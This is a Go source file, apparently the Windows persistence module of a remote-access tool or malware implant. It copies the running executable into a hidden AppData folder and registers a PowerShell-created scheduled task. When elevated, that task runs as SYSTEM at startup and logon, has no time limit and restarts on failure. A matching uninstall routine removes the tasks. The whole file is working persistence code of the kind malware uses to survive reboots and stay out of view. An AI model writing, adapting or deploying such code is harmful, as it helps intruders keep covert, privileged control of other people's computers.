//go:build windows && persist_taskscheduler
// +build windows,persist_taskscheduler

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func init() {
	persistInstallFns = append(persistInstallFns, installTaskSchedulerFull)
	persistUninstallFns = append(persistUninstallFns, uninstallTaskScheduler)
}

func installTaskSchedulerFull(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}
	return installTaskScheduler(targetPath)
}

func installTaskScheduler(targetPath string) error {
	taskName := deriveTaskName(targetPath)
	safe := strings.ReplaceAll(targetPath, "'", "''")

	var script string
	if isElevated() {
		// When elevated, register triggers for both System Startup and User Logon as SYSTEM with Highest run level
		script = fmt.Sprintf(
			`$a = New-ScheduledTaskAction -Execute '%s'; `+
				`$t1 = New-ScheduledTaskTrigger -AtStartup; `+
				`$t2 = New-ScheduledTaskTrigger -AtLogOn; `+
				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1); `+
				`$p = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; `+
				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($t1, $t2) -Settings $s -Principal $p -Force | Out-Null`,
			safe, taskName)
	} else {
		// Standard non-elevated user logon trigger
		script = fmt.Sprintf(
			`$a = New-ScheduledTaskAction -Execute '%s'; `+
				`$t = New-ScheduledTaskTrigger -AtLogOn; `+
				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; `+
				`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; `+
				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null`,
			safe, taskName)
	}
	return runPowerShell(script)
}

func uninstallTaskScheduler() error {
	prefix := executablePrefix()
	return runPowerShell(
		`Get-ScheduledTask -ErrorAction SilentlyContinue | ` +
			`Where-Object { $_.TaskName -like '` + prefix + `*' } | ` +
			`Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue`)
}
